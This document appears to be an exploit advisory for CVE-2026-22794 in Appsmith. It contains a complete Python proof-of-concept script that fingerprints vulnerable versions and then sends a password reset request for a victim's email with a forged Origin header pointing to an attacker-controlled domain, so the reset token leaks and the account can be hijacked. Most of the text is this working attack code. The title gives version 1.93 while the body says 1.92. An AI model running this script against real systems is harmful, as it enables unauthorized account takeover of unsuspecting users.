@@ -1,0 +1,156 @@
+=============================================================================================================================================
+| # Title     : Appsmith 1.93 Origin Header Injection                                                                                       |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.appsmith.com/                                                                                                   |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/214539/ & CVE-2026-22794
+
+[+] Summary    : A critical vulnerability in Appsmith (versions 1.92) allows an unauthenticated attacker to manipulate the Origin HTTP header during the password reset process. 
+                 Due to improper trust in client‑supplied headers, Appsmith constructs password reset links based on the injected origin. This enables an attacker to hijack password 
+				 reset tokens and perform full account takeover without authentication, simply by triggering a reset request for a known user email. 
+                 The issue affects the /api/v1/users/forgotPassword endpoint and can be exploited remotely.
+
+
+[+] POC : python poc.py
+
+
+#!/usr/bin/env python3
+
+import argparse
+import requests
+import json
+import re
+
+def check_vulnerable(target_url):
+    headers = {
+        "User-Agent": "Mozilla/5.0 (compatible; ExploitPoC/1.0)"
+    }
+
+    try:
+        r = requests.get(
+            target_url.rstrip('/') + "/",
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+
+        if r.status_code == 200 and "Appsmith" in r.text:
+            version_match = re.search(
+                r"parseConfig\('v([0-9]+\.[0-9]+)'\)",
+                r.text
+            )
+
+            if version_match:
+                try:
+                    version = float(version_match.group(1))
+                except ValueError:
+                    print("[?] Version parsing failed - assuming vulnerable")
+                    return True
+
+                if version <= 1.92:
+                    print(f"[+] Target is vulnerable! Version: v{version}")
+                    return True
+                else:
+                    print(f"[-] Target is patched (version: v{version})")
+                    return False
+            else:
+                print("[?] Version not found - assuming vulnerable if Appsmith detected")
+                return True
+        else:
+            print("[-] Not an Appsmith instance or unreachable")
+            return False
+
+    except Exception as e:
+        print(f"[-] Error checking: {e}")
+        return False
+
+
+def exploit(target_url, email, evil_domain):
+    vuln_path = "/api/v1/users/forgotPassword"
+
+    headers = {
+        "Origin": f"https://{evil_domain}",
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (compatible; ExploitPoC/1.0)"
+    }
+
+    payload = {
+        "email": email
+    }
+
+    full_url = f"{target_url.rstrip('/')}{vuln_path}"
+
+    print(f"[*] Sending malicious reset request to: {full_url}")
+    print(f"[*] Target email: {email}")
+    print(f"[*] Injected Origin: https://{evil_domain}")
+
+    try:
+        r = requests.post(
+            full_url,
+            headers=headers,
+            json=payload,
+            timeout=10,
+            verify=False
+        )
+
+        if r.status_code in [200, 201, 202] and "success" in r.text.lower():
+            print(f"[+] Exploit succeeded! Status: {r.status_code}")
+            print(
+                f"[+] Check email for reset link — it should point to your evil domain "
+                f"(e.g., https://{evil_domain}/... )"
+            )
+            print("[+] If user clicks, token leaks to your server → takeover account.")
+
+            if r.text.strip():
+                try:
+                    print("\nResponse body:\n" + "-" * 60)
+                    print(json.dumps(r.json(), indent=4))
+                    print("-" * 60)
+                except Exception:
+                    print("[!] Response is not valid JSON")
+
+        else:
+            print(f"[-] Failed - Status: {r.status_code} (may be patched or invalid email)")
+            print(r.text[:500])
+
+    except Exception as e:
+        print(f"[-] Error: {e}")
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(
+        description="CVE-2026-22794 PoC - Appsmith Origin Injection by indoushka"
+    )
+    parser.add_argument(
+        "--target",
+        required=True,
+        help="Target Appsmith URL (e.g. https://appsmith.target.com)"
+    )
+    parser.add_argument(
+        "--email",
+        help="Target user email (e.g. victim@company.com) - required for exploit"
+    )
+    parser.add_argument(
+        "--evil_domain",
+        help="Your attacker domain (e.g. evil.com) - required for exploit"
+    )
+    parser.add_argument(
+        "--check",
+        action="store_true",
+        help="Check if vulnerable without exploiting"
+    )
+
+    args = parser.parse_args()
+
+    if args.check:
+        check_vulnerable(args.target)
+    else:
+        if not args.email or not args.evil_domain:
+            parser.error("--email and --evil_domain are required for exploitation")
+        exploit(args.target, args.email, args.evil_domain)
+
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
